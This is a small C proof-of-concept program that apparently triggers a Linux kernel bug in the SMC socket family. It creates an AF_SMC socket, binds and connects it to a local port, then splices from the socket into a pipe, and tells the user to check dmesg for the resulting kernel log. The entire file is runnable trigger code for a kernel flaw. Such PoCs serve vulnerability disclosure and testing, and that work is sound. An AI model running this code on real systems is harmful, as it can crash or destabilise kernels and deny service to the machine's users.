#include <stdio.h>
#include <netinet/in.h>
#include <sys/syscall.h>
#include <unistd.h>
void poc(void)
{
    int pipefd[2];
    int r=0;
    int smc_sock_fd=socket(AF_SMC,1,0);
    if (smc_sock_fd==-1){
        puts("The SMC kernel module is not loaded. Please load it first.");
        return ;
    }
    struct sockaddr_in server_addr={0};
    server_addr.sin_family=AF_INET;
    server_addr.sin_port=htons(6666);
    r=syscall(__NR_bind,smc_sock_fd,&server_addr,0x10);
    if (r==-1)
    {
        puts("The port is occupied, please switch to another port.");
        return;
    }
    r=syscall(__NR_connect,smc_sock_fd,&server_addr,0x10);
    if (r==-1)
    {
        puts("connect error, kernel code changed. :(");
        return;
    }
    puts("Now, you can check the log by dmesg. :)");
    syscall(__NR_pipe,pipefd);
    syscall(__NR_splice,smc_sock_fd,0,pipefd[1],0,4,8);
}
int main()
{
    poc();
}